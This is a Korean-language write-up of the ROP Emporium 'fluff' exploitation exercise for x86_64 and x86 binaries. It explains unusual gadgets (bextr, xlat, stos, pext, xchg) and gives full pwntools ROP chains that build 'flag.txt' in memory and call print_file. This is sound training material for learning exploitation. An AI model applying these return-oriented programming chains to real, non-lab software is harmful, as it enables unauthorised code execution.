# [fluff](https://ropemporium.com/challenge/fluff.html)
<br />

**Description:**
> The concept here is similar to the write4 challenge, although we may struggle to find simple gadgets that will get the job done.

<br />
<br />

# x86_64

**Binary Protections:**
```yaml
fluff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2b14d9e5fb7a6bcac48b5304b5153fc679c3651c, not stripped

[*] '/home/kali/ROP/fluff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

해당 문제에서는 이전 문제에서 유용하게 사용한 `mov` 가젯을 제공하지 않습니다. 대신 `bextr` 등 생소한 가젯들을 제공하며, 제공된 가젯으로 `"flag.txt"`를 만들어 인자로 전달하면 풀리는 문제입니다.

먼저 풀이를 위해 필요한 가젯을 수집합니다.

<br />

```yaml
$ ROPgadget --binary fluff | grep rdi
0x00000000004006a3 : pop rdi ; ret
```
```yaml
$ objdump -d fluff
Disassembly of section .text:
...
0000000000400617 <usefulFunction>:
  400617:       55                      push   %rbp
  400618:       48 89 e5                mov    %rsp,%rbp
  40061b:       bf c4 06 40 00          mov    $0x4006c4,%edi
  400620:       e8 eb fe ff ff          call   400510 <print_file@plt>
  400625:       90                      nop
  400626:       5d                      pop    %rbp
  400627:       c3                      ret

0000000000400628 <questionableGadgets>:
  400628:       d7                      xlat   %ds:(%rbx)
  400629:       c3                      ret
  40062a:       5a                      pop    %rdx
  40062b:       59                      pop    %rcx
  40062c:       48 81 c1 f2 3e 00 00    add    $0x3ef2,%rcx
  400633:       c4 e2 e8 f7 d9          bextr  %rdx,%rcx,%rbx
  400638:       c3                      ret
  400639:       aa                      stos   %al,%es:(%rdi)
  40063a:       c3                      ret
  40063b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
```
- `pop rdi ; ret = 0x4006a3`
- `print_file_plt = 0x400510`
- `xlat ; ret = 0x400628`
- `pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret = 0x40062a`
- `stos ; ret = 0x400639`

<br />

> [!NOTE]
> [xlat](https://www.felixcloutier.com/x86/xlat:xlatb) 는 `[rbx + al] = al`을 수행합니다. 즉, `rbx`로부터 `al`만큼 떨어진 주소의 1바이트를 `al`에 저장합니다.
>
> [bextr](https://www.felixcloutier.com/x86/bextr) 의 문법은 `BEXTR dest, src, ctrl`이고, `dest = (src >> Start) & ((1 << Length) - 1)`를 수행합니다. `ctrl[7:0]`은 `start`, `ctrl[15:8]`은 `length`를 의미합니다. 따라서 `bextr`은 `src`를 `start`에서부터 `length`만큼 비트를 자르고 제로확장을 하여 `dest`에 저장합니다.
> ```yaml
> > bextr(dest, src=0xDEADBEEFDEADBEEF, ctrl=0x0804(start=4, len=8))
> 
> src : 1101111010101101101111101110111111011110101011011011111011101111 = 0xDEADBEEFDEADBEEF
>                                                           |------|
>                                                               \
>                                                                \
>                                                                 \
>                                                                  v
>                                                               |------|
> dest: 0000000000000000000000000000000000000000000000000000000011101110 = 0x00000000000000EE
> ```
> [stos](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq) 는 레지스터의 값을 메모리에 저장하고, `rdi`를 자동으로 증가시키는 역할을 수행합니다. `stos` 종류에 따라 저장 단위와 증가량이 달라집니다.


<br />

```bash
$ r2 fluff
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00400520]> is
[Symbols]
nth paddr      vaddr      bind   type   size lib name                                   demangled
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
...
24  ---------- 0x00601038 LOCAL  SECT   0        .bss
...

[0x00400520]> / f
0x004003c4 hit0_0 .libfluff.so__gmon_s.
...
[0x00400520]> / l
0x00400239 hit1_0 ./lib64/ld-linux-x8.
...
[0x00400520]> / a
0x004003d6 hit2_0 .uff.so__gmon_start__print_file.
...
[0x00400520]> / g
0x004003cf hit3_0 .libfluff.so__gmon_start__prin.
...
[0x00400520]> / .
0x0040024e hit4_0 ./ld-linux-x86-64.so.2.
...
[0x00400520]> / t
0x00400192 hit5_0 .Ptd@.
...
[0x00400520]> / x
0x00400246 hit6_0 ./lib64/ld-linux-x86-64.so.2.
...
```
위에서 구한 가젯 조합으로 `bss`에 1바이트씩 문자열을 저장할 수 있습니다. 하지만 해당 바이너리에는 `"flag.txt"` 문자열이 없으므로, 문자열을 직접 구해야 합니다. 문자열 주소는 `radare2`로 쉽게 찾을 수 있습니다.
<br />

위 가젯들로 문자열 `"f"`를 추출하겠습니다.

<br />

```yaml
$ gdb fluff -q
...
pwndbg> start
...

pwndbg> x/s 0x004003c4
0x4003c4:       "fluff.so"
pwndbg> x/a 0x004003c4
0x4003c4:       0x6f732e6666756c66
pwndbg> i r $al
al             0xb                 11
pwndbg> set $rcx=0x4003c4 - 11
pwndbg> set $rdx=0x2000
pwndbg> set $rip=0x400633
pwndbg> si
...
pwndbg> set $rip=0x400628
pwndbg> si
...
pwndbg> i r $al
al             0x66                102
```
필요한 레지스터를 세팅하고 `bextr`, `xlat`를 순서대로 호출하면 `al`에 `[rcx]`의 1바이트가 저장된 것을 알 수 있습니다. 이 방법으로 `"flag.txt"`를 만들 수 있습니다.

> [!Caution]
> `xlat`은 `[rbx + al]`에 위치한 1바이트를 `al`에 저장합니다. 위 디버깅 중 레지스터를 세팅하기 전 `al`의 초기 값은 `11`임을 알 수 있습니다. 이 부분을 고려하지 않고 공격 코드를 작성하면 원하는 문자열이 만들어지지 않으므로 주의해야 합니다.

<br />
<br />

```python
from pwn import *

context.log_level = 'error'
context.bits = 64

p = process('./fluff')

def write_byte():
    al = 11  # initial al = 11
    pay = flat(pop_rdi, bss)
    for c in target:
        rcx = flag_addr[c]-al-0x3ef2
        pay += flat(bextr, 0x2000, rcx, xlat, stos)

        al = ord(c)
    return pay

bextr = 0x40062a  # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
xlat = 0x400628
stos = 0x400639

pop_rdi = 0x4006a3
bss = 0x601038
print_file = 0x400510

flag_addr = {
  'f': 0x004003c4, 'l': 0x00400239,
  'a': 0x004003d6, 'g': 0x004003cf,
  '.': 0x0040024e, 't': 0x00400192,
  'x': 0x00400246
}

target = 'flag.txt'

pay = b'A'*40
pay += write_byte()
pay += flat(pop_rdi, bss, print_file)

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```

<br />
<br />

# x86

**Binary Protections:**
```yaml
fluff32: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6da69ceae0128f63bb7160ba66f9189a126fdd86, not stripped

[*] '/home/kali/ROP/fluff32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

`x86_64` 문제처럼 `x86`문제도 `pext` 등 생소한 가젯을 제공합니다. 이 가젯들을 이용하여 `"flag.txt"`를 만들어 인자로 호출하면 풀리는 문제입니다.

먼저 풀이를 위해 필요한 가젯을 수집합니다.

<br />

```yaml
$ objdump -d fluff32
Disassembly of section .text:

0804852a <usefulFunction>:
 804852a:       55                      push   %ebp
 804852b:       89 e5                   mov    %esp,%ebp
 804852d:       83 ec 08                sub    $0x8,%esp
 8048530:       83 ec 0c                sub    $0xc,%esp
 8048533:       68 e0 85 04 08          push   $0x80485e0
 8048538:       e8 93 fe ff ff          call   80483d0 <print_file@plt>
 804853d:       83 c4 10                add    $0x10,%esp
 8048540:       90                      nop
 8048541:       c9                      leave
 8048542:       c3                      ret

08048543 <questionableGadgets>:
 8048543:       89 e8                   mov    %ebp,%eax
 8048545:       bb ba ba ba b0          mov    $0xb0bababa,%ebx
 804854a:       c4 e2 62 f5 d0          pext   %eax,%ebx,%edx
 804854f:       b8 ef be ad de          mov    $0xdeadbeef,%eax
 8048554:       c3                      ret
 8048555:       86 11                   xchg   %dl,(%ecx)
 8048557:       c3                      ret
 8048558:       59                      pop    %ecx
 8048559:       0f c9                   bswap  %ecx
 804855b:       c3                      ret
 804855c:       66 90                   xchg   %ax,%ax
 804855e:       66 90                   xchg   %ax,%ax
```
```yaml
$ ROPgadget --binary fluff32 | grep ebx
0x08048399 : pop ebx ; ret
```
- `print_file = 0x80483d0`
- `pext edx, eax, ebx ; mov eax, 0xdeadbeef ; ret = 0x804854a`
- `mov eax, 0xdeadbeef ; ret = 0x804854f`
- `xchg [ecx], dl ; ret = 0x8048555`
- `pop ecx ; bswap ecx ; ret = 0x8048558`
- `pop ebx ; ret = 0x08048399`

<br />

> [!NOTE]
> [pext](https://www.felixcloutier.com/x86/pext) 의 문법은 `PEXT dest, src, mask`이고, `mask`의 비트 중 1의 위치와 같은 위치의 `src` 비트를 추출하여 하위 비트(LSB)부터 채워 넣습니다. 압축된 비트는 `dest`에 저장됩니다.
> ```yaml
> > pext(dest, src=0xdeadbeef, mask=0xc6)
>                                       MSB < =================== > LSB
> 
> idx : 32 31 30 29 28 27 26 25 24 23 22 21 20 19 18 17 16 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1
> src :  1  1  0  1  1  1  1  0  1  0  1  0  1  1  0  1  1  0  1  1  1  1  1  0  1  1  1  0  1  1  1  1  (0xdeadbeef)
>                                                                                |  |  |     |  |  |  |
>                                                                                v  v  v     v  v  v  v
> mask:  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  1  1  0  0  0  1  1  0  (0xc6)
>                                                                                \  \  \     |  |  |  |
>                                                                                 \  \  \    |  |  |  |
>                                                                                  \  \  \   |  |  |  |
>                                                                                   v  v  v  v  v  v  v
> dest:  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  1  1  0  0  1  1  0  (0x66)
> ```
> [xchg](https://www.felixcloutier.com/x86/xchg) 의 문법은 `XCHG dest, src`이고, 두 오퍼랜드의 값을 바꿉니다. `레지스터 <-> 레지스터`, `메모리 <-> 레지스터` 모두 값을 바꾸는게 가능합니다.
>
> [bswap](https://www.felixcloutier.com/x86/bswap) 는 레지스터의 바이트 순서를 완전히 뒤집습니다.

<br />

아래는 [pdep](https://www.felixcloutier.com/x86/pdep)와 같은 연산을 하는 코드이며, 위에서 설명한 `pext`의 개념과 반대됩니다. 해당 로직을 실행하여 얻은 결과 값을 `pext`의 `mask`에 대입하면 원하는 문자열을 추출할 수 있습니다.
```python
$ python3 -q
>>> def pdep32(src, mask):
...     res = 0
...     src_i = 0
...     for i in range(32):
...         if (mask >> i) & 1:
...             if (src >> src_i) & 1:
...                 res |= (1 << i)
...             src_i += 1
...     return res
...
>>> flag = 'flag.txt'
>>> for c in flag:
...     res = pdep32(ord(c), 0xdeadbeef)
...     print(f"{c}:", hex(res))
...
f: 0xc6
l: 0xcc
a: 0xc1
g: 0xc7
.: 0x4e
t: 0xe4
x: 0xe8
t: 0xe4
```

<br />

```yaml
$ gdb fluff32 -q
...
pwndbg> start
...
pwndbg> set $eax=0xdeadbeef
pwndbg> set $ebx=0xc6
pwndbg> set $eip=0x804854a
pwndbg> si
...

pwndbg> i r edx
edx            0x66                102
pwndbg> elf
0x804a018 - 0x804a020  .data
...
pwndbg> set $ecx=0x804a018
pwndbg> set $eip=0x8048555
pwndbg> si
...

pwndbg> x/x 0x804a018
0x804a018:      0x00000066
```
위에서 구한 가젯으로 `data`에 1바이트씩 문자열을 저장할 수 있습니다. 필요한 레지스터를 세팅하고 `pext`, `xchg`를 순서대로 호출하면 `data`에 `0x66`이 저장된 것을 알 수 있습니다.

위에서 알아낸 정보와 방식으로 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = 'x86'

p = process("./fluff32")

eax_deadbeef = 0x804854f   # mov eax, 0xdeadbeef ; ret
pop_ebx = 0x08048399
pext = 0x804854a           # pext edx, eax, ebx ; mov eax, 0xdeadbeef ; ret
xchg = 0x8048555
pop_ecx_bswap = 0x8048558
print_file = 0x80483d0
data = 0x0804a018

flag = {'f': 0xc6, 'l': 0xcc, 'a': 0xc1, 'g': 0xc7, '.': 0x4e, 't': 0xe4, 'x': 0xe8}

target = 'flag.txt'
def write_byte():
    pay = b''
    for i, c in enumerate(target):
        pay += flat(pop_ecx_bswap, p32(data+i, endian='big'), pop_ebx, flag[c], pext, xchg)

    return pay

pay = b'A'*44
pay += p32(eax_deadbeef)
pay += write_byte()
pay += flat(print_file, {4:data})

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
fluff by ROP Emporium
x86

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```
